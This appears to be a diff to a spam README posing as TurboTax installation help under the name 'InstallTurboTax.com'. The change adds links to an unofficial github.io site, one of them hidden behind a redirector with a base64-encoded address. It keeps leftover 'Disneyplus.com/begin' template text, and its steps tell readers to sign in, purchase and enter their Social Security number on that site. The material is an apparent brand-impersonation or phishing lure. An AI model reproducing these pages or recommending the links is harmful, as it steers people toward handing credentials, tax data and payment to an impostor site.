@@ -1,12 +1,16 @@
 # InstallTurboTax.com
 
-![Disneyplus.com/begin](Enterlicensecode.png "Disneyplus.com/begin")
+<div align="center">
+  <a href="https://ww0.us/?aHR0cHM6Ly9pbnN0YWxsdHVyYm90YXgyMDI1LmdpdGh1Yi5pbw==">
+    <img src="Enterlicensecode.png" alt="InstallTurboTax.com" title="InstallTurboTax.com">
+  </a>
+</div>
 
-**InstallTurboTax.com** is a unique tax preparation website that provides TurboTax software installation instructions or downloads, along with tools to help maximize your tax refund. TurboTax software can be downloaded and installed on your computer in various ways.
+**[installturbotax.com](https://installturbotax2025.github.io/)** is a unique tax preparation website that provides TurboTax software installation instructions or downloads, along with tools to help maximize your tax refund. TurboTax software can be downloaded and installed on your computer in various ways.
 
-## How to Install TurboTax
+## How to Install TurboTax Using Installturbotax.com?
 
-1. Visit [installturbotax.com](#) and click **Sign In** in the top-right corner.
+1. Visit [installturbotax.com](https://installturbotax2025.github.io/) and click **Sign In** in the top-right corner.
 2. Sign in with your TurboTax account or click **Create Account** to register.
 3. Answer the setup questions to select the appropriate TurboTax version.
 4. Enter your personal and financial details, including income, expenses, and Social Security number.
@@ -15,8 +19,11 @@
 
 ## Install TurboTax with CD Drive
 
-![Disneyplus.com/begin](Install%20TurboTax%20with%20CD%20Drive.png "Disneyplus.com/begin")
-
+<div align="center">
+  <a href="https://installturbotax2025.github.io/">
+    <img src="Install TurboTax with CD Drive.png" alt="InstallTurboTax.com" title="InstallTurboTax.com">
+  </a>
+</div>
 To install TurboTax using a CD drive, follow these steps:
 
 1. Insert the TurboTax CD into your computer's CD drive.
@@ -30,7 +37,7 @@ To install TurboTax using a CD drive, follow these steps:
 
 **To install TurboTax without a CD drive, follow these steps:**
 
-1. Visit [installturbotax.com](#) and purchase TurboTax online.
+1. Visit [installturbotax.com](https://installturbotax2025.github.io/) and purchase TurboTax online.
 2. Download the software and double-click the file to start the installation.
 3. Follow the on-screen instructions to complete the installation.
 4. Launch TurboTax and begin filing your taxes.
